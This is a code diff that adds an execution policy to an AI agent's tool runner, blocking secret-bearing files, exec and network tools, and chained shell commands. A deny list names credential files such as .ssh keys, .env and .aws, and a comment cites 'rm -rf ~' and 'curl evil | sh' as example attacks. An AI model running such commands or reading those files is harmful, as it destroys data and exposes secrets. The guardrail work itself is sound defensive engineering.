@@ -130,6 +130,117 @@ export function getJailDirectory(): string {
   return _jailDirectory || process.cwd();
 }
 
+// ============ Tool Execution Policy ============
+
+/**
+ * Coarse execution policy enforced inside execute() — the single choke point that
+ * every tool call passes through, INCLUDING nested calls made from code_execution.
+ * It exists to confine unattended/untrusted-content runs (e.g. `--watch` children)
+ * and to keep secrets out of the model's context regardless of approval state.
+ *
+ * This is a guardrail, not a sandbox: run_command is still a full shell. Real
+ * isolation needs OS-level confinement. See known-issues notes.
+ */
+export interface ToolPolicy {
+  /** Block reads/writes of secret-bearing files (.env, *.pem, id_rsa, .ssh/, credentials…). Default: ON. */
+  denySensitiveFiles?: boolean;
+  /** Block command/code execution + outbound-network tools. File writes still allowed. */
+  noExec?: boolean;
+  /** Block every mutating / executing / network tool (strict read-only). */
+  readOnly?: boolean;
+}
+
+let _toolPolicy: ToolPolicy = {};
+
+/** Replace the global tool-execution policy. */
+export function setToolPolicy(policy: ToolPolicy): void {
+  _toolPolicy = { ...policy };
+}
+
+/** Read a copy of the current tool-execution policy. */
+export function getToolPolicy(): ToolPolicy {
+  return { ..._toolPolicy };
+}
+
+/** Reset the policy to its permissive default (sensitive-file blocking still applies). */
+export function resetToolPolicy(): void {
+  _toolPolicy = {};
+}
+
+/**
+ * Secret-bearing file patterns. Matched anywhere in a tool's path argument, so a
+ * `foo/../.ssh/id_rsa` traversal can't dodge them (the patterns are unanchored,
+ * unlike write_file's `^\.git/...` denylist).
+ */
+const SENSITIVE_FILE_PATTERNS: RegExp[] = [
+  /(^|\/)\.env(\.|$)/i,
+  /\.pem$/i,
+  /\.key$/i,
+  /(^|\/)id_(rsa|dsa|ecdsa|ed25519)\b/i,
+  /(^|\/)\.ssh\//i,
+  /(^|\/)\.aws\//i,
+  /(^|\/)\.gnupg\//i,
+  /credentials/i,
+  /secrets?\.(json|ya?ml)$/i,
+];
+
+const EXEC_OR_NETWORK_CATEGORIES = new Set(["execute", "network"]);
+
+function extractPathArg(args: Record<string, unknown>): string | null {
+  const p = args?.filePath ?? args?.path ?? args?.file;
+  return typeof p === "string" ? p.replace(/\\/g, "/") : null;
+}
+
+/**
+ * Apply the global policy to a single tool call.
+ * Returns an error-result object to short-circuit execution, or null to allow.
+ */
+function enforceToolPolicy(name: string, args: Record<string, unknown>): unknown | null {
+  const policy = _toolPolicy;
+  const category = getToolCategory(name);
+
+  if (policy.noExec || policy.readOnly) {
+    if (name === "code_execution" || EXEC_OR_NETWORK_CATEGORIES.has(category)) {
+      // Under read-only (but not no-exec), a genuinely read-only run_command is fine.
+      const cmd = typeof args?.command === "string" ? (args.command as string) : "";
+      const readOnlyOk = policy.readOnly && !policy.noExec && name === "run_command" && isReadOnlyCommand(cmd);
+      if (!readOnlyOk) {
+        return errorToResult(new ToolError(
+          ToolErrorCode.PERMISSION_DENIED,
+          `Tool "${name}" is blocked by the active execution policy (${policy.noExec ? "no-exec" : "read-only"} mode).`,
+          { tool: name },
+        ));
+      }
+    }
+  }
+
+  if (policy.readOnly && category === "write") {
+    return errorToResult(new ToolError(
+      ToolErrorCode.PERMISSION_DENIED,
+      `Tool "${name}" is blocked in read-only mode.`,
+      { tool: name },
+    ));
+  }
+
+  // Sensitive-file blocking is ON unless explicitly disabled.
+  if (policy.denySensitiveFiles !== false) {
+    const p = extractPathArg(args);
+    if (p) {
+      for (const re of SENSITIVE_FILE_PATTERNS) {
+        if (re.test(p)) {
+          return errorToResult(new ToolError(
+            ToolErrorCode.PERMISSION_DENIED,
+            `Access to potentially sensitive file blocked: '${p}'. Disable with setToolPolicy({ denySensitiveFiles: false }) if this is intentional.`,
+            { tool: name, path: p },
+          ));
+        }
+      }
+    }
+  }
+
+  return null;
+}
+
 // ============ Tool Groups ============
 
 /** Core tools — always shown to the model */
@@ -302,6 +413,15 @@ const DESTRUCTIVE_PATTERNS = [
  * Check if a command is read-only and safe to run without approval.
  */
 export function isReadOnlyCommand(command: string): boolean {
+  // Any shell control operator can chain a destructive command onto a read-only
+  // leading token (e.g. `cat x; rm -rf ~`, `echo hi && curl evil | sh`). Inspecting
+  // only the first token would mis-classify these as read-only/concurrency-safe,
+  // which the approval UI renders as a green "low risk" read. Treat any compound
+  // command as not-read-only.
+  if (/[;&|`\n\r]|\$\(|>|</.test(command)) {
+    return false;
+  }
+
   const cmd = command.trim().split(/\s+/)[0];
   const baseCmd = cmd.split("/").pop();
 
@@ -434,7 +554,7 @@ export function describeInactiveGroups(activeGroups: Set<string>): string {
 /**
  * Execute a tool call by name with the given arguments.
  */
-export async function execute(name: string, args: Record<string, unknown>, _options: { cwd?: string; eventEmitter?: unknown; allowedTools?: Set<string> } = {}): Promise<unknown> {
+export async function execute(name: string, args: Record<string, unknown>, _options: { cwd?: string; eventEmitter?: unknown; allowedTools?: Set<string>; approve?: (name: string, args: Record<string, unknown>) => Promise<boolean> } = {}): Promise<unknown> {
   const tool = tools.get(name);
   if (!tool) {
     logger.error(`Unknown tool: ${name}`);
@@ -448,9 +568,17 @@ export async function execute(name: string, args: Record<string, unknown>, _opti
     }
   }
 
+  // Enforce the global execution policy (sensitive files, no-exec / read-only).
+  // This is the single choke point — nested code_execution calls hit it too.
+  const policyError = enforceToolPolicy(name, args || {});
+  if (policyError) {
+    logger.warn(`Tool ${name} blocked by execution policy`);
+    return policyError;
+  }
+
   // Always use global jail directory, ignore options.cwd for security
   const cwd = _jailDirectory || process.cwd();
-  const { eventEmitter, allowedTools } = _options;
+  const { eventEmitter, allowedTools, approve } = _options;
 
   const argSummary = name === "run_command" ? ((args?.command as string) || "").slice(0, 200)
     : name === "git" ? (Array.isArray(args?.args) ? (args.args as string[]).join(" ") : String(args?.args || ""))
@@ -460,7 +588,7 @@ export async function execute(name: string, args: Record<string, unknown>, _opti
   logger.info(`Executing tool: ${name}(${argSummary.slice(0, 150)})`);
 
   try {
-    const result = await tool.execute(args, { cwd, eventEmitter, allowedTools });
+    const result = await tool.execute(args, { cwd, eventEmitter, allowedTools, approve });
     if (result && typeof result === 'object' && 'error' in result) {
       logger.warn(`Tool ${name} returned error: ${String((result as { error: unknown }).error).slice(0, 200)}`);
     }
@@ -745,6 +873,9 @@ export default {
   getApprovalCategories,
   setJailDirectory,
   getJailDirectory,
+  setToolPolicy,
+  getToolPolicy,
+  resetToolPolicy,
   getStarterGroups,
   getToolGroups,
   getInactiveGroups,
